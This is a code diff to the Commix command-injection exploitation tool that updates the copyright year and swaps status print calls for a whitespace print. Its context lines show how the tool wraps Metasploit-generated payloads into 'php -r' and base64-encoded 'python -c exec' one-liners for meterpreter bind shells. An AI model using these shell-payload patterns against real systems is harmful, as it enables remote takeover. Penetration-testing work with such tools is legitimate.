@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2020 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -274,7 +274,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print(settings.SUCCESS_STATUS)
+        print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -291,7 +291,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print(settings.FAIL_STATUS)
+        print(settings.SINGLE_WHITESPACE)
 
       break
 
@@ -365,7 +365,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print(settings.SUCCESS_STATUS)
+        print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -382,7 +382,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print(settings.FAIL_STATUS)
+        print(settings.SINGLE_WHITESPACE)
       break
 
     # Python-bind-shell(meterpreter)
@@ -410,7 +410,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = ''.join(data)
           data = base64.b64encode(data)
 
-        print(settings.SUCCESS_STATUS)
+        print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -427,7 +427,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
-        print(settings.FAIL_STATUS)
+        print(settings.SINGLE_WHITESPACE)
       break
     # Check for available shell options  
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
